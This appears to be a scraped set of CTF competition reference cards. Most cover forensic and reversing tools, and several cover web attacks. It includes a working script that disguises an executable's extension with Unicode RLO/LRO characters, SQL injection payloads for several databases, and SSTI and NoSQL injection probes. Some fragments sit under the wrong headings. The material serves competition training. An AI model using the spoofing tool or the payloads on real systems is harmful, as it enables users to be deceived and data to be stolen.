item.title: Lro Rlo File Ext
item.description:
#!/usr/bin/env python3
"""Build the RLO/LRO filename pattern shown in the M2 lab writeup."""

from __future__ import annotations

import argparse
import json
from pathlib import Path

RLO = "\u202e"
LRO = "\u202d"


def build_name(display_name: str, extension: str, prefix: str | None) -> tuple[str, str]:
    if not extension.startswith(".") or len(extension) < 2:
        raise ValueError("--extension must include its leading dot, for example .exe")

    if prefix is None:
        marker_at = display_name.lower().find(extension.lower())
        if marker_at <= 0:
            raise ValueError(
                f"{display_name!r} has no {extension!r} inside it; supply --prefix "
                "whose text is the start of the display name and ends in the real extension"
            )
        prefix = display_name[: marker_at + len(extension)]

    if not display_name.startswith(prefix):
        raise ValueError("--prefix must match the beginning of the displayed name")
    if not prefix.lower().endswith(extension.lower()):
        raise ValueError("--prefix must end with the real extension")

    remainder = display_name[len(prefix) :]
    if not remainder:
        raise ValueError("the prefix must leave some displayed text after it")

    # RLO reverses the remainder for display. LRO then starts a left-to-right
    # run containing the prefix. That prefix is last in the stored name, so its
    # final extension remains the file's actual extension.
    stored_name = RLO + remainder[::-1] + LRO + prefix
    return stored_name, prefix


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Preview or apply the M2 lab RLO/LRO filename pattern."
    )
    parser.add_argument("source", type=Path, help="Existing file, such as payload.exe")
    parser.add_argument("display_name", help="Name you want the UI to display")
    parser.add_argument(
        "--prefix",
        help="Displayed starting text ending with the source file's real extension; inferred when possible",
    )
    parser.add_argument("--apply", action="store_true", help="Rename the source file")
    parser.add_argument(
        "--literal",
        action="store_true",
        help="Print the raw Unicode name too; bidi controls are invisible",
    )
    args = parser.parse_args()

    if not args.source.is_file():
        parser.error(f"source file does not exist or is not a regular file: {args.source}")
    if "/" in args.display_name or "\\" in args.display_name:
        parser.error("display_name must be a filename, without directory separators")

    extension = args.source.suffix
    if not extension:
        parser.error("source file has no extension to preserve")

    try:
        stored_name, prefix = build_name(args.display_name, extension, args.prefix)
    except ValueError as exc:
        parser.error(str(exc))

    remainder = args.display_name[len(prefix) :]
    destination = args.source.with_name(stored_name)
    print(f"Displayed name: {args.display_name}")
    print(f"Source file:    {args.source}")
    print(f"Real extension: {extension}")
    print(f"Split:          {prefix!r} + {remainder!r}")
    print(f"Escaped name:   {json.dumps(stored_name, ensure_ascii=True)}")
    print("Controls:       U+202E RLO, then U+202D LRO")
    if args.literal:
        print("Literal destination name follows; bidi controls are invisible:")
        print(stored_name)

    if args.apply:
        if destination.exists():
            parser.error(f"destination already exists: {destination!s}")
        args.source.rename(destination)
        print(f"Renamed to:     {destination}")
    else:
        print("Preview only. Add --apply to rename the source file.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

For plaintext HTTP on an unusual port, inspect the bytes for a request/status line, then use Analyze → Decode As → HTTP. A port alone is insufficient.

tshark -r traffic.pcapng -d tcp.port==8080,http -Y 'http.request'

HTTP/2 uses binary frames and stream IDs. A TCP connection can contain many simultaneous HTTP/2 requests. Match an HTTP/2 stream within its connection; a tcp.stream value alone is not a single request.

item.title: 03 · DNS / Encoded Labels
item.description:
DNS Analysis and Data Reconstruction

Flow: queries and answers → suspicious suffix → direction → sequence/retries → encoding → exact bytes.

Tools: Wireshark, TShark, CyberChef, Python.

1. Inventory names, types, and answers

dns
dns.flags.response == 0
dns.flags.response == 1
dns.qry.type == 16
dns.qry.name contains "exfil.example"

Type 16 is TXT. Also inspect A, AAAA, CNAME, and unusual label lengths. DNS can carry data in query names or answer records.

tshark -r traffic.pcapng -Y 'dns' -T fields \
  -E header=y -E separator=/t \
  -e frame.number -e ip.src -e ip.dst -e dns.id \
  -e dns.flags.response -e dns.qry.name -e dns.qry.type \
  -e dns.a -e dns.aaaa -e dns.cname -e dns.txt > dns.tsv

Inspect repeated field values before parsing an export as one-record-per-line. One DNS message can contain multiple questions/answers; the simple reconstruction helper assumes one relevant query name per exported line.

item.title: Static Analysis · Bytes, Types & Control Flow
item.description:
Static analysis

Recover the exact computation, not just a readable-looking decompiler listing. The details that usually decide a solve are length, integer width, signedness, byte order and the order of transformations.

1. Work backward from the decisive check

Success message
  ← deciding branch
  ← comparison / aggregate result
  ← transformed input / expected table
  ← preprocessing and original input source

Trace all callers when preprocessing occurs outside the validator. fgets may preserve a newline; scanf("%s") stops at whitespace; read returns bytes and may not append NUL. A length check can reject an otherwise correct decoded string.

item.title: 05 · TCP / UDP Sessions
item.description:
TCP and UDP: Framing, State, and Exact Bytes

Flow: establish liveness → identify framing → read banner → send exact message → interpret reply → keep the session through success.

Tools: Wireshark, TShark, Python, HxD.

1. Separate transport failure from payload failure

Observation Meaning Next action
Connection refused No listener / explicit rejection on that address Verify current endpoint
Connect timeout Routing/filtering/unresponsive endpoint One minimal liveness check
TCP connected, no bytes May be waiting for client message Read protocol/source before sending
recv() returns b'' TCP peer closed its sending side Preserve bytes already read; classify EOF
Socket timeout No bytes within the chosen deadline Not equivalent to EOF or malformed payload
UDP receive timeout No datagram observed No proof of open/closed port or valid message

If the user supplies a complete solver and a current endpoint, run that artifact before re-deriving it. If an instance expired, retry unchanged against the refreshed endpoint before changing the protocol assumptions.

item.title: Dynamic Debugging · Break, Inspect, Dump
item.description:
Dynamic debugging

Ask a narrow question, stop at the relevant instruction, inspect exact bytes, then verify the original program. Use the challenge VM/runtime and keep an unmodified executable copy.

1. Choose the debugger

Binary Tool
Native Linux ELF GDB
Native Windows PE x64dbg / x32dbg matching bitness
Managed .NET dnSpyEx
Cross-platform Ghidra mapping Ghidra Debugger / optional sync with supported backend

A native debugger can inspect CLR runtime code, but dnSpyEx exposes managed methods, metadata and locals more directly. A decompiled address is not automatically a runtime address under ASLR.

wlan
radiotap
eapol

item.title: Strings & Encodings · Preserve the Bytes
item.description:
Strings and encodings

1. ASCII and wide strings

strings -a -e b -n 4 -t x challenge

item.title: 07 · CAN / Cannelloni
item.description:
CAN Bus: Observe, Decode, Then Change State

Flow: verify interface → establish tunnel if supplied → record baseline → decode ID/data semantics → send one known frame → monitor the actual outcome.

Tools: can-utils, cannelloni, WSL, Wireshark, Python.

1. Identify the provided transport

Input Start
candump text log Parse timestamp/interface/ID/data offline
CAN PCAP/PCAPNG Inspect decoded CAN fields in Wireshark
SocketCAN interface candump on the supplied interface
IP/port described as cannelloni Match UDP/TCP mode and return addressing
Arbitrary custom TCP service Read protocol before treating it as raw CAN

Classic CAN and CAN FD have different payload limits. A CAN identifier is not automatically a sender ID; its interpretation comes from the application protocol.

item.title: Crypto & Obfuscation · Identify, Model, Verify
item.description:
Crypto and obfuscation in reversing

Identify the actual operation from code and constants. A familiar constant is a clue; a complete state update and data flow make the identification credible.

1. Quick recognition

Pattern Candidate What to record
XOR same byte / periodic table Single/repeating XOR Key bytes, starting offset, period
Add/subtract index Position-dependent transform Truncation width, index origin
Rotate + XOR/add Custom byte/word mixing Width, count, order
0x811c9dc5, multiply 0x01000193 FNV-1a 32-bit candidate XOR-before-multiply vs after, width, seed
0x9e3779b9 with paired word rounds TEA/XTEA-like candidate Exact round equations and endian
256-element permutation + swaps RC4-like state KSA/PRGA, drop count, key
expand 32-byte k + add/xor/rotate ChaCha/Salsa family Variant, nonce/counter layout
S-box/table rounds AES or custom substitution Match full structure, mode/key/IV
Dispatch loop and bytecode PC Custom VM Opcode widths, state, semantics

Standard crypto can also be hidden behind library calls. Inspect call arguments before reimplementing it. The Python cookbook covers library-backed crypto where permitted; the downloads here use stdlib byte transforms.

item.title: Python 3
item.description:
Use for: byte manipulation, decoding, small solvers, artifact parsing.
Run in: WSL. Exact Python 3.x version depends on the competition PC.

Tournament rule: additional libraries are allowed except AI/ML related libraries and tools.

Choose the operation first

Kind Examples Required information
Text encoding UTF-8, UTF-16LE, Latin-1 Character encoding
Binary-to-text encoding Hex, Base64, Base32, Base85 Alphabet and framing; no secret key
Escaping URL percent escapes, HTML entities Escaping convention
Compression gzip, zlib, bzip2, LZMA/XZ Wrapper/format; usually no key
Classical cipher Caesar, ROT13, Vigenère Shift or keyword, alphabet rules
XOR One byte, repeating key, stream XOR Key/keystream or a recoverable weakness
Symmetric encryption AES, ChaCha20, Salsa20 Key plus mode-specific IV/nonce/counter
Authenticated encryption AES-GCM/EAX, ChaCha20-Poly1305 Key, nonce, ciphertext, tag, optional AAD
Public-key encryption RSA / RSA-OAEP Private key or a demonstrated weakness
Hash / MAC / KDF SHA-256, HMAC, PBKDF2, scrypt Exact input bytes and algorithm parameters

Encoding is reversible without a secret. Hashes do not have a general decode/decrypt operation. A value that resembles hex could represent ciphertext, a hash, a key or ordinary bytes; identify its role from the challenge.

1. FTP: control and file data are separate

ftp
ftp-data
ftp.request.command == "USER"
ftp.request.command == "PASS"
ftp.request.command == "RETR"
ftp.request.command == "STOR"

  2. Record the requested file and transfer direction.
  3. Inspect PORT / EPRT or PASV / EPSV setup.
  4. Identify the corresponding data connection.
  5. Save the data-channel direction containing the file, then inspect its bytes.

A directory listing is not a downloaded archive. The first FTP stream may contain credentials while a later connection carries the actual artifact.

item.title: Python Snippets · Byte Workbench & Check Models
item.description:
Offline Python reversing snippets

Download before the event, keep the model explicit and verify the forward transform. These command-line scripts use Python 3 standard library by default and make no network requests. They are separate from Ghidra’s script runtimes.

Downloads

  • byte_workbench.py: explicit input bytes, slicing, XOR, all single-byte candidates, byte rotates/add/subtract, word swaps, Base64/hex and ROT13.
  • solve_constraints.py: a documented reversible validator example with a forward assertion; optional --z3 solves the same model if that separate package is permitted and installed.

These tools implement stated transformations; they do not automatically infer an unknown algorithm or solve arbitrary binaries. Local --output paths write binary files and may replace an existing file, so choose distinct output names.

item.title: 01 · SQLi — Start Here
item.description:
SQL Injection — Start Here

Order: establish context → confirm true/false → identify engine → choose UNION or blind → enumerate schema → read the target row.

1. What does your input sit inside?

Possible original query Try as the input Why
WHERE id = INPUT 1 AND 1=1 / 1 AND 1=2 Numeric expression needs no quote
WHERE name = 'INPUT' apple' AND '1'='1 / apple' AND '1'='2 Preserve the original closing quote
WHERE name = 'INPUT' apple' AND 1=1-- - / apple' AND 1=2-- - Comment out the remaining query
WHERE name LIKE '%INPUT%' apple%' AND 1=1-- - / apple%' AND 1=2-- - Close the wildcard string
WHERE (name = 'INPUT') apple') AND 1=1-- - / apple') AND 1=2-- - Close the parenthesis too
ORDER BY INPUT 1, 2, 999 Identifier/expression position, not a quoted value

Choose apple / 1 to match an existing row. An AND test on a nonexistent row is false for both probes. If the query has extra predicates or nested parentheses, reconstruct that shape before copying a UNION payload.

item.title: First 10 Minutes
item.description:
Steganography triage

Do the cheap structural checks before broad guessing. Preserve the original bytes; every transformation goes into a new file.

1. Record and classify

Standard-library Python works even when a dedicated file/hash utility is unavailable:

from pathlib import Path
import hashlib

p = Path("challenge.bin")
h = hashlib.sha256()
with p.open("rb") as stream:
    head = stream.read(32)
    h.update(head)
    for block in iter(lambda: stream.read(1024 * 1024), b""):
        h.update(block)
print("size", p.stat().st_size, "head", head.hex(), "sha256", h.hexdigest())
Starting bytes Candidate
89 50 4e 47 0d 0a 1a 0a PNG
ff d8 ff JPEG
47 49 46 38 37 61 / 47 49 46 38 39 61 GIF
42 4d BMP
50 4b 03 04 ZIP member; DOCX/PPTX/XLSX are ZIP containers too
25 50 44 46 2d PDF
52 49 46 46 .... 57 41 56 45 RIFF/WAVE; confirm bytes 8–11 are WAVE
1f 8b 08 gzip candidate
fd 37 7a 58 5a 00 xz candidate

A signature is not enough: confirm the format with a matching parser. Do not rename random bytes and call them an image repair.

Read the surrounding calls, branches and referenced constants. Move into Ghidra or gdb for data flow and runtime values.

item.title: 02 · SQLi — MySQL / MariaDB
item.description:
MySQL / MariaDB SQLi

Prerequisite: a confirmed injection, correct closure, column count, and reflected text slot. If not, start with SQLi.

The first payload below assumes a single-quoted input, three columns, and the second column displayed. Queries after it are fragments to adapt into that same UNION slot.

1. Confirm engine and current schema

missing' UNION SELECT NULL,CONCAT_WS(':',VERSION(),DATABASE(),CURRENT_USER()),NULL-- -

VERSION() distinguishes a MySQL/MariaDB build when its output is visible. DATABASE() can be NULL when no default schema is selected. CURRENT_USER() describes the account used for privilege checks; USER() describes the connection identity.

item.title: strings
item.description:
Use for: quick readable text triage in binaries, images and memory dumps.
Run in: WSL; GNU Binutils.

Quick commands

strings -a challenge.bin                       # Scan the whole artifact
strings -a -n 6 challenge.bin                  # Suppress strings shorter than six
strings -a -t x challenge.bin > strings_hex_offsets.txt  # Retain byte offsets
strings -a -e l challenge.bin > utf16le_strings.txt      # Windows-style wide text
strings -a -e b challenge.bin > utf16be_strings.txt      # Big-endian wide text

-a: whole file. -n: minimum length. -t x: hexadecimal offsets. -e l: 16-bit little endian, often useful for Windows text.

item.title: 03 · SQLi — PostgreSQL
item.description:
PostgreSQL SQLi

Flow: version() → database/schema → tables → columns → text-cast data. Start with SQLi if the insertion context is not yet confirmed.

1. Identify engine and context

Example input: three-column UNION, second column accepts text.

missing' UNION SELECT NULL,version(),NULL-- -
missing' UNION SELECT NULL,current_database()||':'||current_schema()||':'||current_user,NULL-- -

PostgreSQL is strict about UNION types. A text expression in an integer slot fails even if the injection itself works. Try each position with NULL elsewhere; cast retrieved values with ::text, but do not expect a cast to repair an incompatible original UNION column type.

item.title: zsteg
item.description:
Use for: bit plane and LSB steganography in PNG/BMP images.
Run in: WSL; Ruby gem already supplied.

Quick commands

zsteg --help                                  # Discover supported options
zsteg image.png                               # Run normal image stego checks
zsteg -a image.png > zsteg_results.txt         # Search all supported combinations

Walkthrough: extract a detected channel

  1. Run zsteg image.png.
  2. Look for coherent text or a recognizable file signature.
  3. Copy the exact channel selector from that result.
  4. Extract it with -E and inspect the saved bytes.
# Example selector; replace it with the result from YOUR image
zsteg -E 'b1,rgb,lsb,xy' image.png > extracted.bin
xxd -l 64 extracted.bin
strings -a extracted.bin

Read the selector

b1,rgb,lsb,xy
│  │   │   └─ pixel traversal order
│  │   └───── least significant bit interpretation
│  └───────── selected color channels
└──────────── one bit per selected channel

Gotchas

  • -a is a broad search; false positives are common.
  • JPEG is not this tool’s normal target format.
  • Resizing or re-saving an image can destroy hidden bits; analyze the original.
  • An extracted stream may need another decode/decompression step.

CTF: narrow the search after the first scan

# Save broad results once rather than repeatedly scanning
zsteg -a image.png > scan.txt 2>&1
grep -niE 'flag|text:|file:' scan.txt

# Inspect only a specific bit count/channel combination
zsteg --bits 1 --channels r image.png
zsteg --bits 1 --channels rgb image.png

Use zsteg --help to confirm the installed selector switches. A channel finding should lead to extraction and verification.

item.title: 04 · SQLi — SQLite
item.description:
SQLite SQLi

Flow: sqlite_version() → sqlite_schema → CREATE TABLE SQL → actual columns → target rows.

SQLite is common in small Python/PHP CTF apps. Framework language alone is not proof of SQLite. First establish the injection context.

1. Identify engine

Three-column UNION with second column displayed:

missing' UNION SELECT NULL,sqlite_version(),NULL-- -

No DATABASE() / @@VERSION / information_schema in ordinary SQLite. Its schema catalog is sqlite_schema; the older name sqlite_master remains widely usable.

1. Fingerprint

SELECT DB_NAME(),SCHEMA_NAME(),SYSTEM_USER,USER_NAME();
SELECT name FROM sys.databases;

item.title: Zeek
item.description:
Use for: turning PCAP traffic into connection, DNS, HTTP and TLS logs.
Run in: WSL.

Generate logs from a capture

cd zeek_out
zeek -r ../traffic.pcap

If checksum offloading prevents useful analysis, retry in a fresh output folder with zeek -C -r ../traffic.pcap. -C ignores checksum validation.

Pick the useful log

File CTF use
conn.log Who talked to whom, ports, timing and byte counts
dns.log Queried domains and answers
http.log Hosts, URIs, methods and status codes
ssl.log TLS handshake metadata, when observed

  • Only observed protocols generate their associated logs.
  • TLS application content remains encrypted without appropriate decryption elsewhere.
  • Reuse the Zeek connection uid to correlate records across logs.

Flags and log settings

Syntax Meaning
-r FILE Read offline traffic from a PCAP
-i INTERFACE Capture live traffic; appropriate privileges required
-C Ignore checksum validation
LogAscii::use_json=T Write JSON records instead of normal TSV logs
zeek-cut FIELD... Select named columns from Zeek TSV logs

-r reads an input capture; generated logs are written in your current working directory. Use a fresh directory for every run.

item.title: ZBar
item.description:
Use for: decoding QR codes and supported barcodes from images.
Run in: WSL; the image CLI is zbarimg.

Decode a QR image

# Shows barcode type plus decoded value
zbarimg code.png

# Write only the decoded payload
zbarimg --quiet --raw code.png > decoded.txt

Scan several images

# Normal output retains image/scan context better than raw payload alone
zbarimg *.png

# Raw output for a known single image
zbarimg --raw frame_001.png

CTF walkthrough

  1. Save the original QR/barcode image.
  2. Run zbarimg and keep the decoded value.
  3. Check whether it is a URL, Base64, hex, or plain text.
  4. Continue in CyberChef or Python if another encoding is present.

If it does not decode

  • Check whether the whole code and its surrounding quiet border are visible.
  • Try a clearer supplied frame or image when available.
  • A stylized, damaged or incomplete code may need reconstruction first.
  • No result does not prove the image contains no hidden data; use zsteg/binwalk for other image clues.

Check the installed build’s supported formats and options with zbarimg --help.

item.title: Burp Suite Community Edition
item.description:
Use for: intercepting HTTP, editing requests and comparing responses.
Run in: WSL GUI according to the supplied list; needs a working display.
Listed version: 2026.4.x; verify the competition build under Help/About.

Launch the supplied application

# If the installation provides a launcher on PATH
burpsuite

# Alternative only when the organizer supplies a JAR and Java
java -jar /path/to/burpsuite_community.jar

Walkthrough: modify a request

  1. Start a temporary project with default settings.
  2. Proxy → Intercept → Open browser uses Burp’s configured browser.
  3. Browse to the assigned challenge.
  4. Find the request in Proxy → HTTP history.
  5. Right click → Send to Repeater.
  6. In Repeater, send the unchanged request to establish a baseline.
  7. Change one parameter; compare status, response length and body.

Useful tools

Tool Use
Repeater Manually replay and edit requests
Decoder Convert URL/Base64/hex representations
Comparer Spot differences between responses
Intruder Small controlled payload sets; Community has restrictions
HTTP history Recover actual cookies, headers and request bodies

Gotchas

  • Leave Intercept off when ordinary browsing appears stuck.
  • Repeater needs the correct target host, port and HTTPS setting.
  • CSRF tokens and session cookies can expire.
  • Windows Chrome talking to a WSL proxy may need additional routing/proxy setup; prefer the configured Burp browser when available.
  • Community does not include the Professional automated scanner. Follow the tournament’s ban on AI related additions.

Read an HTTP request before editing it

POST /api/item HTTP/1.1
Host: challenge.example
Content-Type: application/json
Cookie: session=REPLACE

{"id":7}

The method/path chooses the action, Host chooses the virtual host, the cookie identifies the session, and Content-Type tells the server how to parse the body. Keep a baseline before editing any of them.

item.title: Images: LSB & Bit Planes
item.description:
Lossless image LSB and bit planes

Determine the decoded image mode first. RGB samples, RGBA alpha, grayscale values and palette indices are different carriers.

1. Inspect before extraction

exiftool -a -u -g1 image.png
zsteg image.png

If Pillow is already installed and allowed:

from PIL import Image
with Image.open("image.png") as im:
    print(im.format, im.mode, im.size, getattr(im, "n_frames", 1))
    print("bands:", im.getbands(), "metadata keys:", sorted(im.info))
Mode What the helper reads
RGB Red, green, blue 8-bit sample values
RGBA RGB plus independent alpha values
L Grayscale sample (--channels l)
P Palette indices (--channels i), not converted RGB values
16-bit / floating / other Helper rejects; inspect sample depth before a separate explicit conversion

Palette-to-RGB conversion can destroy an index-based message. Converting RGBA to RGB discards alpha. Read Pillow mode concepts before making conversions.

item.title: SSTI · Identify the Engine First
item.description:
Server-side template injection

Order: raw-response evaluation → engine-specific syntax → context objects → file/data access → command execution only if needed. A reflected 49 identifies expression evaluation, not a particular engine and not command execution.

1. First requests

Find greetings, custom email templates, PDF previews, error messages, product descriptions and editable themes. Save the normal response before sending one probe at a time.

Raw input Control Interpretation
AA{{7*7}}ZZ AA{{7*8}}ZZ AA49ZZ / AA56ZZ: expression evaluation in this delimiter family
AA${7*7}ZZ AA${7*8}ZZ FreeMarker, EL or another ${} engine; investigate
AA<%= 7*7 %>ZZ AA<%= 7*8 %>ZZ ERB/EJS family; distinguish Ruby from JavaScript
AA#{7*7}ZZ AA#{7*8}ZZ Some Ruby/Pug/EL contexts; only meaningful with supporting syntax
AA{7*7}ZZ AA{7*8}ZZ Smarty-like arithmetic possible

Inspect raw HTTP, then browser DOM. Evaluation only after JavaScript executes may be client-side template injection. A static 49 elsewhere is irrelevant. Literal payload may mean data is passed safely to a fixed template, wrong delimiter, wrong render stage, or escaping before compilation.

item.title: jq
item.description:
Use for: reading JSON API responses, filtering records and decoding log structure.
Run in: WSL.

Inspect structure

jq . response.json                    # Pretty print
jq 'keys' response.json               # Top-level object keys
jq 'type' response.json               # Object, array, string, etc.
jq '.items | length' response.json    # Count records

Extract fields

jq -r '.flag' response.json           # String without JSON quotes
jq -r '.items[].name' response.json   # Names inside an array
jq '.items[] | select(.id == 7)' response.json
jq -r '.items[] | [.id, .name] | @tsv' response.json

CTF: search nested text values

# Unknown schema: inspect all string values for a clue
jq -r '.. | strings | select(test("flag|secret"; "i"))' response.json

# Missing field fallback
jq -r '.flag // .message // "no matching field"' response.json

Handle JSON Lines and encoded JSON

# One JSON object per line
jq 'select(.status == 200)' events.jsonl

# A field that itself contains JSON text
jq '.payload | fromjson' response.json

# Supply a string without shell interpolation inside the filter
jq --arg name 'alice' '.items[] | select(.name == $name)' response.json

Gotchas

  • Bash single quotes protect jq’s $variables from shell expansion.
  • -r emits text and can lose JSON type/quoting information.
  • jq parses JSON; HTML error responses will fail.

Flags and filter operators explained

Syntax Meaning
-r Emit string results without JSON quotes
-c Compact each JSON result onto one line
-s Read all input JSON values into one array
-R Read each input line as a raw string rather than parsing JSON
-n Run without consuming JSON input
--arg NAME VALUE Define a jq string variable safely
--argjson NAME JSON Define a variable containing parsed JSON
.items[] Emit each element/value from items
select(CONDITION) Keep values satisfying a condition
// Fallback for null/false values
.. Recursively visit values
@tsv / @csv Format an array as one TSV/CSV record

The | inside a quoted jq filter is jq’s pipeline. An unquoted shell | connects separate processes.

item.title: NoSQL Injection · Operators & Blind Reads
item.description:
NoSQL injection

First decide which parser you control: JSON query operators or a string inserted into JavaScript. $ne is not SQL syntax; ' || true is not a valid JSON operator object.

1. Establish a baseline

Record status, redirect destination, body marker, session cookie and the resulting /me identity. A redirect or new cookie can represent a failed/anonymous session.

POST /login HTTP/1.1
Host: ctf.invalid
Content-Type: application/json

{"username":"admin","password":"definitely-wrong"}

Try one changed field at a time. If the server uses findOne({username: body.username, password: body.password}), an object may be treated as a predicate. If it coerces to a string or hashes a string password first, operator objects usually do not help.

item.title: Ghidra
item.description:
Use for: static disassembly, decompilation and validation logic.
Run in: WSL GUI per the supplied list. Listed version: 12.1.4.

Launch the supplied installation

# Run from the installed Ghidra directory
./ghidraRun

Walkthrough: find the input check

  1. File → New Project → Non-Shared Project.
  2. Import the binary, inspect the detected format/architecture, then open it.
  3. Accept auto analysis.
  4. Search → For Strings; search for success/failure text.
  5. Follow a string’s references to its caller.
  6. Read the Decompiler alongside the assembly listing.
  7. Identify input, transformations, constants and comparison length.
  8. Rename functions/variables and save the project.

Useful navigation

Action Common key/control
Go to address G
Rename selected symbol L
References to selected item Right click → References
Follow function Double click
Inspect imports/functions Symbol Tree
Show raw bytes Bytes field / Byte Viewer

CTF notes

  • Translate the validation loop into Python and reproduce it on known input.
  • Check array sizes, signedness and endianness in assembly.
  • An entry function is not always main; follow startup calls.
  • Apply meaningful names as you learn what a value does.

Gotchas

  • Decompiled C is an approximation; verify surprising logic in assembly.
  • A wrong architecture or image base gives misleading results.
  • Packed/encrypted code may need runtime analysis in gdb/x64dbg.

CTF: work backward from a success string

  1. Search for a distinctive success or rejection string.
  2. List every cross-reference; one string can have several callers.
  3. Find the branch deciding which message is printed.
  4. Trace the compared buffer/value backward to its producer.
  5. Record preprocessing: newline stripping, length checks, XOR, encoding or hashing.
  6. Reproduce the exact operations in Python.
  7. Confirm the generated candidate follows the binary’s full success path.

CTF: translate a byte validation loop

// Example logic recovered during analysis
for (i = 0; i < length; i++) {
    if ((input[i] ^ 0x23) != expected[i]) return 0;
}

The inverse is input[i] = expected[i] ^ 0x23. Export the actual array bytes, preserve the iteration count, and test the inverse by reapplying the forward transform.

item.title: The Sleuth Kit
item.description:
Use for: disk partitions, filesystem records and deleted file recovery.
Run in: WSL. Autopsy provides a Windows GUI workflow.

Locate the filesystem

# Find partition start sectors
mmls disk.img

# Example start sector: replace 2048 with YOUR partition's start
fsstat -o 2048 disk.img

-o is a sector offset, not a byte offset. For a filesystem-only image, omit -o. Confirm sector size from the image/tool output; -b can specify it when needed.

List current and deleted entries

fls -r -p -o 2048 disk.img > file_listing.txt
fls -r -d -p -o 2048 disk.img > deleted_listing.txt
grep -niE 'flag|secret|password' file_listing.txt

Recover a selected entry

# Replace 12345 with the metadata address printed by fls
istat -o 2048 disk.img 12345
icat -o 2048 disk.img 12345 > recovered.bin

# Attempt deleted-file recovery using its listed metadata address
icat -r -o 2048 disk.img 12345 > recovered_deleted.bin

On NTFS, a listed address can include attribute components such as 12345-128-1; preserve the complete address.

item.title: OpenSSL
item.description:
Use for: Base64, hashes, certificate/key inspection and known-parameter decryption.
Run in: WSL; listed as OpenSSL 3.x.

Decode or hash a file

openssl version
openssl base64 -d -in encoded.txt -out decoded.bin
openssl base64 -d -A -in single_line_base64.txt -out decoded.bin
openssl dgst -sha256 challenge.bin

-A is useful for Base64 supplied as one unwrapped line.

Inspect keys and certificates

# Certificate subject, issuer and validity dates
openssl x509 -in certificate.pem -noout -subject -issuer -dates

# All certificate fields
openssl x509 -in certificate.pem -noout -text

# Public/private key parameters
openssl pkey -pubin -in public.pem -text -noout
openssl pkey -in private.pem -text -noout

# ASN.1 structure
openssl asn1parse -in certificate.pem

Add -inform DER for binary DER input where the command supports it.

item.title: xz
item.description:
Use for: decompressing XZ/LZMA streams and checking archive integrity.
Run in: WSL.

Inspect before decompressing

xz --version
xz -l evidence.xz             # Size, ratio and stream summary
xz -lv evidence.xz            # More stream/block details
xz -t evidence.xz             # Integrity test; no extracted output

Decompress while preserving the input

xz -dk evidence.xz

# Explicit output filename; keeps original and writes bytes to stdout
xz -dc evidence.xz > evidence.bin

# Legacy .lzma stream
xz --format=lzma -dc evidence.lzma > evidence.bin

CTF walkthrough

  1. Identify an XZ stream directly or through binwalk.
  2. Record its offset if it is embedded inside another file.
  3. Carve it, check integrity with xz -t, then decompress.
  4. Inspect the resulting bytes with xxd and strings.
# Example embedded offset; replace 4096 with the actual value
dd if=container.bin of=carved.xz bs=1 skip=4096 status=none
xz -dc carved.xz > recovered.bin
xxd -l 64 recovered.bin

Gotchas

  • xz -d normally removes the compressed input after success; add -k to keep it.
  • .tar.xz decompresses into a tar archive, not its individual members.
  • A raw LZMA stream needs the correct filter settings; it is different from a .lzma container.

Flags explained

Flag Meaning
-d Decompress
-k Keep the original input after successful operation
-c Write output to stdout instead of a generated filename
-t Test compressed-stream integrity
-l List compressed-stream information
-v Verbose output; combines with -l
--format=lzma Select the legacy .lzma container
--memlimit-decompress=LIMIT Bound decompression memory use

-dk combines -d and -k; -dc combines decompression with stdout output. Shell > saves that stdout into the requested filename.

item.title: qpdf
item.description:
Use for: PDF structure, decompressed objects, encryption and attachments.
Run in: WSL.

Check the document

qpdf --check challenge.pdf
qpdf --show-encryption challenge.pdf
qpdf --show-npages challenge.pdf
qpdf --show-pages challenge.pdf

Make objects easier to read

# Produces a separate PDF with readable object structure
qpdf --qdf --object-streams=disable challenge.pdf readable.pdf
strings -a readable.pdf | grep -iE 'flag|secret|JavaScript|EmbeddedFile'

This is structural inspection, not guaranteed text extraction. Use pdftotext for normal page text.

Extract an attachment

qpdf --list-attachments challenge.pdf

# Use the exact key reported above; it may differ from the filename
qpdf --show-attachment='attachment-key' challenge.pdf > attachment.bin

Inspect and extract a stream object

# Replace 12 with the relevant object number
qpdf --show-object=12 challenge.pdf
qpdf --show-object=12 --filtered-stream-data challenge.pdf > stream.bin

--filtered-stream-data decodes supported stream filters; the result may still be binary.

item.title: llvm-mc (LLVM tools)
item.description:
Use for: assembling instructions and decoding short byte sequences across architectures.
Run in: WSL. Some distributions name the executable llvm-mc-VERSION.

Inspect the installed targets

llvm-mc --version
llvm-mc --help

x86-64: instruction → bytes

printf 'mov eax, 42\nret\n' | llvm-mc \
  --triple=x86_64-pc-linux-gnu --x86-asm-syntax=intel --show-encoding

Use this to confirm a candidate instruction’s encoding while reading a CTF binary.

x86-64: bytes → instruction

printf '0x90 0xc3\n' | llvm-mc \
  --triple=x86_64-pc-linux-gnu --disassemble --output-asm-variant=1

The example decodes a NOP followed by RET. The disassembler input is textual hex bytes.

item.title: xxd
item.description:
Use for: hex dumps, byte offsets, hex decoding and small binary edits.
Run in: WSL; supplied with Vim tooling.

Inspect a file header or region

xxd -l 64 challenge.bin                  # First 64 bytes
xxd -s 0x100 -l 64 challenge.bin         # Region at hex offset 0x100
xxd -g 1 challenge.bin                  # One byte per group
xxd -e -g 4 -l 64 challenge.bin          # Display little-endian 32-bit groups

Convert bytes ↔ plain hex

xxd -p challenge.bin > plain_hex.txt
xxd -r -p plain_hex.txt > restored.bin

# Decode a short known hex string
printf '666c61677b64656d6f7d' | xxd -r -p

Make a C-style byte array

xxd -i challenge.bin > challenge_array.h

CTF: patch a working copy

cp challenge.bin patched.bin

# Write one 0x90 byte at offset 0x20 in the copy
printf '00000020: 90\n' | xxd -r - patched.bin

# Confirm the modified region
xxd -s 0x20 -l 16 patched.bin

Gotchas

  • Normal dump offsets are hex; do not confuse 0x20 with decimal 20.
  • A patch uses a file offset, not a process virtual address.
  • xxd -r can silently ignore text that is not valid dump data; confirm the resulting bytes.
  • Use -r -p for plain hex and -r for an addressed xxd dump.

Flags explained

Flag Meaning
-l N Read at most N input bytes
-s OFFSET Start at an input byte offset
-g N Group N bytes together in the display
-e Show groups in little-endian word order
-p Produce plain hex without addresses/ASCII columns
-r Reverse a hex dump into bytes
-r -p Decode plain hex text
-i Produce a C include-style byte array
-c N Set bytes per output line

-r means reverse conversion here. It does not mean recursive or read-PCAP.

item.title: fsck.fat (dosfstools)
item.description:
Use for: diagnosing or repairing a FAT filesystem image.
